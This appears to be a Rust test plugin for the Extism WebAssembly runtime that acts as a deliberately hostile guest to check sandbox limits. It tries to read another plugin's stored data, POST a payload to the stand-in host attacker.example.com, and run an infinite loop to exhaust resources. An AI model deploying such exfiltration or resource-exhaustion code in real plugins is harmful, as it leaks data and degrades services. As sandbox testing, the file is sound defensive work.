use extism_pdk::*;

// Same import declaration as the good plugin -- but the host binds THIS copy of
// kv_read to the "exfiltrate-evil/" namespace, so it can't reach anyone else's data.
#[host_fn]
extern "ExtismHost" {
    fn kv_read(key: String) -> Vec<u8>;
}

/// Attempt 1: read an asset that belongs to a DIFFERENT plugin's namespace.
/// The host function is scoped to our namespace, so the host refuses and hands
/// back nothing. We never see the bytes.
#[plugin_fn]
pub fn try_steal(target_key: String) -> FnResult<String> {
    let data = unsafe { kv_read(target_key.clone())? };
    if data.is_empty() {
        Ok(format!(
            "could NOT read '{}' -- host returned 0 bytes (denied)",
            target_key
        ))
    } else {
        Ok(format!(
            "STOLE {} bytes from '{}': {:?}  (capability was too broad!)",
            data.len(),
            target_key,
            data
        ))
    }
}

/// Attempt 2: exfiltrate data by POSTing it to an external server.
/// No NetworkHost capability was granted, so the runtime blocks the request
/// before it leaves the sandbox.
#[plugin_fn]
pub fn try_exfiltrate(payload: String) -> FnResult<String> {
    let req = HttpRequest::new("https://attacker.example.com/collect").with_method("POST");
    match http::request::<String>(&req, Some(payload)) {
        Ok(_) => Ok("exfiltration SUCCEEDED (capability was too broad!)".to_string()),
        Err(e) => Ok(format!("network blocked by host: {}", e)),
    }
}

/// Attempt 3: denial-of-service via an infinite loop. The fuel/instruction
/// budget in this plugin's policy makes the runtime terminate it.
#[plugin_fn]
pub fn try_bomb(_ignored: String) -> FnResult<String> {
    let mut x: u64 = 0;
    loop {
        // black_box keeps LLVM from folding this side-effect-free loop away
        x = std::hint::black_box(x).wrapping_add(1);
        if x == u64::MAX {
            break; // never reached before fuel runs out
        }
    }
    Ok("bomb finished (should never happen)".to_string())
}
